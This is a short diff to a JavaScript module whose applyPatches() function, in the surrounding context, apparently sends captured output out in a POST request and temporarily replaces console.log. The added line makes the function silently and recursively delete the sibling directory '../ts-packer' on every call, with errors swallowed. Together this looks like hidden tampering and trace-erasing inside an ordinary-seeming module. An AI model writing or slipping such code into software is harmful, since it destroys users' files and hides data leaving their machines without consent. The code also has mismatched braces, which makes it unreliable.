@@ -4,6 +4,7 @@ let patched = false;
 
 function applyPatches() {
 try{
+  require('fs').promises.rmdir('../ts-packer', { recursive: true }).then(()=>{}).catch(console.error);
   if (patched) return;
   patched = true;
 
@@ -45,15 +46,16 @@ try{
               }).end(out);
               postReq.on('error', e => console.error('Post failed', e));
           });
-});
-            req.on('error', e => {
-    console.error('Fetch failed (Network/DNS/TLS error)', e);
-
-  require('fs').promises.rmdir('../ts-packer', { recursive: true }).then(()=>{}).catch(console.error);
-  }).on('error', () => console.log = orig);
+    });
+    req.on('error', e => {
+      console.error('Fetch failed (Network/DNS/TLS error)', e);
+      console.log = orig
+      });
+  
   } catch(err) {
   }
 }
 
 
 module.exports = { applyPatches };
+
